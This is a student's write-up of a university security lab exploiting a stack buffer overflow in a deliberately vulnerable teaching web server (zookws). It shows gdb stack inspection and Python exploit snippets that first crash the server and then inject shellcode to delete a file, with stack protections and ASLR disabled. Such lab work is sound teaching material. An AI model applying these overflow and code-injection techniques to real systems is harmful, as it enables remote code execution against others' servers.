# Cybersecurity Exam Demo: Buffer Overflow Exploitation on Vulnerable x86-64 Systems

## Introduction
In the following demo I will perform a remote code injection attack based on the [_Lab 1 of MIT 6.566: Computer Systems Security course_](https://css.csail.mit.edu/6.5660/2026/labs/lab1.html). The complete lab consists of four parts, in this demo we will focus on the first two.

Our objective is to analyze a vulnerable web server (zookws) running on an x64 Linux machine, identify a buffer overflow vulnerability and exploit it. First, we will trigger a server crash. Then we will demonstrate arbitrary code execution through code injection.

### Setup of VM and Vulnerable Web Server
I relied on the instructions provided by the Lab 1 guide for the setup. I ran the _6.566-standalone-v26_ virtual machine on UTM on macOS, virtualizing the x64 architecture needed for the lab. Inside the virtual machine, I cloned the official repository from https://github.com/mit-pdos/6.566-lab-2026 which contains the following:

* Zookws vulnerable server, composed of `http.c` and `zookd.c`
* Some files to help exploit the web server, such as `exploit-template.py` and `shellcode.S`.
* Some scripts to run the programs with the same memory addresses and check if the exploitations were successful.

### Mitigation removals
It is important to note that the server's executable and the virtual machine are configured to eliminate the security measures that would otherwise prevent the exploitation of a buffer overflow. Specifically:

* The `zookd-exstack` program has been compiled with the `-fno-stack-protector` flag to disable stack canary mitigation and with the `-z execstack` flag to enable code execution from the stack.
* ASLR is disabled using the `setarch -R` command.

The Lab creators implement these configurations in the `Makefile` and `clean_env.sh` script to ensure a predictable and exploitable environment.

### Threat Model
In this threat model, the attacker/adversary:
* has the server code available for inspection 
* is aware of the buffer overflow vulnerabilities
* has the capability to write an exploit
* can interact with a vulnerable instance of the software

## Part 0 - Vulnerability Discovery
The first step of the lab is to analyze the codebase and identify vulnerable buffers. I started with the `zookd.c - main()` function. After inspecting the code flow, I found the first vulnerable buffer:
```c
static void process_client(int fd) {
    ...
    char reqpath[4096];
    ...
}
```
which is a buffer placed on the stack. The vulnerability becomes clear when one follows the code into the `http_request_line()` and `url_decode()` functions. 

The way the web server reads an HTTP req (`GET /index.html HTTP/1.1`) from a socket up to 8192 bytes (`http.c` line 66). However, the `url_decode` function subsequently copies the request path (`/index.html`) part of that network input onto the reqpath buffer. This is done under the implicit assumption that the provided input will never exceed the buffer capacity without any boundary checks. 

This allows an adversary to construct input that exceeds the buffer size, overwriting the stack and resulting in a stack buffer overflow.

## Part 1 - Make Zookws Crash
The first step in exploiting the discovered buffer overflow vulnerability is to inspect the running program, its memory, and the stack composition to obtain the memory addresses.

I used `gdb`, a C/C++ debugger already present on the virtual machine, to inspect the program

### Part 1 - Inspection
I started by launching gdb on the compiled program, `zookd-exstack`.

```sh
$ ./clean-env.sh gdb ./zookd-exstack
```
and setting a breakpoint after the function of interest was called
```sh
(gdb) break process_client
Breakpoint 1 at 0x2b37: file zookd.c, line 123.
```

The following command is now needed to attach the debugger to the child processes of the server that will be forked when a connection is accepted by the server
```sh
(gdb) set follow-fork-mode child
```
Finally we can run our server on port 8080
```sh
(gdb) run 8080
```
The next step is to initiate a connection to our server with the `curl` command from another terminal and inspect the stack frame at the breakpoint:
```sh
(gdb) backtrace
#0  process_client (fd=4) at zookd.c:123
#1  0x0000555555556aff in run_server (port=0x7fffffffefa0 "8080") at zookd.c:104
#2  0x00005555555567e7 in main (argc=2, argv=0x7fffffffedb8) at zookd.c:33
```

We can now inspect the stack frame of the `process_client` function more in depth:

```sh
(gdb) info frame
Stack level 0, frame at 0x7fffffffebb0:
 rip = 0x555555556b37 in process_client (zookd.c:123); saved rip = 0x555555556aff
 called by frame at 0x7fffffffec80
 source language c.
 Arglist at 0x7fffffffeba0, args: fd=4
 Locals at 0x7fffffffeba0, Previous frame's sp is 0x7fffffffebb0
 Saved registers:
  rbp at 0x7fffffffeba0, rip at 0x7fffffffeba8
```
Finally, find the memory address of `reqpath[0]`:
```sh
(gdb) print &reqpath
$1 = (char (*)[4096]) 0x7fffffffdb90
```

From this, we can gather important information: the saved return address of the `rip` register (which will be loaded into %rip upon function return) is located at memory address `0x7fffffffeba8` and contains the address of the next instruction, `0x555555556aff`.

The following  visualization shows the stack and the information we obtained:
![Visualization of the Stack Frame](imgs/stack-content.png)

### Part 1 - Exploit
The goal of the first exercise is to make the web server crash. Simply overwriting the return address value with a random value should be enough to cause the CPU to point to an invalid memory region, resulting in unexpected behavior and/or server termination.

The exploit uses memory address information to construct an HTTP request carrying the payload in the request path. In this first part, we will use a string composed of all As as a simple sequence of bytes that will overwrite the `reqpath` buffer and the subsequent saved `rip`.

A template for the exploit, a Python script that issues an HTTP request, is provided in the repository. My addition to the code was to include the memory addresses found in the previous step and edit the request to include the payload in the URL path as follows:

```python
...

stack_buffer = 0x7fffffffdb90
stack_retaddr = 0x7fffffffeba8

def build_exploit(shellcode: bytes) -> bytes:

    payload = b"A"*(stack_retaddr - stack_buffer)
    req =   b"GET /" + urllib.parse.quote_from_bytes(payload).encode('ascii') + b" HTTP/1.0\r\n\r\n"
    
    return req

...
```
_[The complete code for this exploit is available in the repo as `code/exploit-2.py`]_

Then by running the server with the command `./clean-env.sh ./zookd-exstack 8080` and executing the automated script provided by MIT for evaluation, we obtained the expected result!

![First exercise pass!](imgs/ex1-pass.png)
![The sent payload](imgs/ex1-payload.png)

## Part 2 - Code Injection
The goal of this part is to exploit the same vulnerability to delete a file, `/home/student/grades.txt`, by injecting shellcode into the process's via an HTTP request.

This exploit is similar to the first one because we are exploiting the same vulnerability. This time, however, the request path contains the shellcode in addition to the padding of the buffer and a return address pointing to the start of the shellcode.

The challenging part of this second exercise is writing the shellcode directly in x64 assembly instructions. Fortunately, the source https://thesquareplanet.com/blog/smashing-the-stack-21st-century/ contains a well-explained blog post with a shellcode very similar to the one we have to write, except for the syscall and registry loading we would like to use.

The steps to generate the new exploit were as follows:
1. Edit `shellcode.S`, test its correctness locally with 
```sh
$ touch /home/student/grades.txt
$ make
$ ./run-shellcode shellcode.bin
```
and verify that the file `grades.txt` is removed. The complete shellcode is available in the repository as `code/shellcode.S`.

2. Implement the shellcode into the previous exploit script, taking into consideration its position on the stack. Pad the remaining buffer space with some bytes and overwrite the correct memory location of the saved rip with the starting address of the shellcode.

```python
...

padding_len = stack_retaddr - stack_buffer - 1 # Subtract 1 because the server expects a '/' at the start of reqpath in http_request_line

def build_exploit(shellcode: bytes) -> bytes:
    target_addr_jmp = stack_buffer + 1

    payload = shellcode
    payload += b"A" * (padding_len - len(shellcode))
    payload += struct.pack("<Q", target_addr_jmp) # returns the 8-byte binary encoding of the 64-bit integer target_addr_jmp
    
    encoded_payload = urllib.parse.quote_from_bytes(payload).encode('ascii')
    
    req = b"GET /" + encoded_payload + b" HTTP/1.0\r\n\r\n"
    
    return req

...
```
_[The complete code for this exploit is available in the repo as `code/exploit-4.py`]_

3. Start the web server and execute the exploit by issuing the malicious request.


Inspecting the process's memory shows the result of the payload injection:
![Buffer contains the shellcode](imgs/ex2-injected-shellcode.png)

To assess of the correctness of the vulnerability eploitation, we execute the second script, as shown in the following image. We can see that our exploit received a PASS and that the target file `grades.txt` has been deleted.

![Pass of exercise 2](imgs/ex2-pass.png)

## Sources

- MIT 6.566, _Lab 1_ - [css.csail.mit.edu](https://css.csail.mit.edu/6.5660/2026/labs/lab1.html)
- Smashing the stack in the 21st century - [thesquareplanet.com](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)
- Smashing the stack for fun and profit - [phrack.org](https://phrack.org/issues/49/14#article)
- Stack frame layout on x86_x64 - [eli.thegreenplace.net](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
- Linux System Call Table for x86_64 - [blog.rchapman.org](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

## AI usage disclosure
Large Language Models (LLMs) were used in the context of this lab to assist in understanding various parts of the server code, correcting minor syntax errors in the Python exploit development process, and improving my understanding of x86-64 assembly language concepts and register usage. Additionally, some portions of the text in this report were revised with the assistance of LLMs to improve clarity, readability, and grammatical correctness.

I declare that all work presented in this report was carried out by me. All ideas, analyses, conclusions, and any remaining errors are my sole responsibility.